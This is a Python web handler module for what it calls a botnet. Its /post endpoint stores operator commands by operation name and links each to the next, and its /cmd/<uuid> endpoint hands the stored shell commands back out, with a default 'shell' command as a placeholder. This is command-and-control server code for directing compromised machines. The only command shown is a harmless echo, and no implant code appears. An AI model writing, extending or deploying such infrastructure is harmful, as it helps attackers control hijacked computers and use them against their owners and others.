import logging, uuid, datetime, re, os, secrets
from wsgiref.util import FileWrapper

from util import BaseHandler, engine, requires_params, verify_peer, log_file
import models

from sqlalchemy.orm import sessionmaker
from sqlalchemy import desc
Session = sessionmaker(bind=engine)

logger = logging.getLogger(__name__)
logging.basicConfig(format='%(asctime)s - %(message)s',
                    level=logging.INFO, filename=log_file)


class access_db:
    """Wrapper class for accessing the database.

    This automatically closes database connectiosn on completion,
    and is designed solely for convenience.

    Example:
    with access_db() as conn:
        my_obj = do_stuff()
        db_conn.add(my_obj)
        db_conn.commit()
    """

    def __enter__(self):
        """Connects to the database and returns the connection as part of the setup process."""
        self.db_conn = Session()
        return self.db_conn

    def __exit__(self, type, value, traceback):
        """Closes the db connection as part of the teardown process."""
        self.db_conn.close()

class Post(BaseHandler):
    """Post a new command for the botnet."""
    @verify_peer()
    @requires_params('cmd_type', 'cmd_data', 'op_name')
    def post(self):
        # TODO: some sort of auth to make sure only allowed users can do this lol
        # There should also probably be some sort of password stuff + MFA?
        logger.info(f'{self.base_request} /post')
        generated_uuid = uuid.uuid4()
        op_name = self.request.data['op_name']

        # Fetch the previous command given.
        has_prev_cmd = False
        try:
            with access_db() as db_conn:
                prev_command = db_conn.query(models.Command).\
                    filter(models.Command.op_name==op_name).\
                    order_by(desc(models.Command.created)).\
                    limit(1).first()
                if prev_command:
                    has_prev_cmd = True
        except Exception as e:
            logger.warn(e)
        
        try:
            with access_db() as db_conn:
                cmd = models.Command(
                    guid=generated_uuid, 
                    op_name=op_name
                )
                cmd.cmd_type = self.request.data['cmd_type']
                cmd.cmd_data = self.request.data['cmd_data']
                cmd.created = datetime.datetime.now()
                if has_prev_cmd:
                    prev_command = db_conn.query(models.Command).\
                        filter(models.Command.op_name==op_name).\
                        order_by(desc(models.Command.created)).\
                        limit(1).first()
                    prev_command.next_cmd = cmd.guid
                db_conn.add(cmd)
                db_conn.commit()
                logger.info(f'New command: {cmd.guid} -- {cmd.cmd_type}: {cmd.cmd_data}')
        except Exception as e:
            logger.warn(e)
            return self.HTTP_404()
        else:
            return self.HTTP_200(data={'cmd_guid': str(generated_uuid)})

        return self.HTTP_200()

class Command(BaseHandler):
    def get(self, cmd_id):
        """This should return a specific command given its unique ID."""
        logger.info(f'{self.base_request} /cmd/{cmd_id}')

        if cmd_id == '00000000-0000-0000-0000-000000000000':
            data = {
                'type': 'shell',
                'cmd': """echo 'Hello!'""",
            }
            return self.HTTP_200(data=data)

        with access_db() as db_conn:
            data = {}
            try:
                cmd_uuid = uuid.UUID(cmd_id)
                cmd = db_conn.query(models.Command).\
                    filter(models.Command.guid==cmd_uuid).\
                    first()
                if not cmd:
                    return self.HTTP_404()
                data['type'] = cmd.cmd_type
                data['cmd'] = cmd.cmd_data
                if cmd.next_cmd:
                    data['next'] = str(cmd.next_cmd)
            except Exception as e:
                logger.warn(f'Exception encountered while fetching command {cmd_id}')
                logger.warn(e)
                return self.HTTP_404()
            else:
                return self.HTTP_200(data=data)
            # we may also want to delete commands after a period of time?

routes = [
    ('/post', Post()),
    ('/cmd/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', Command()),
]
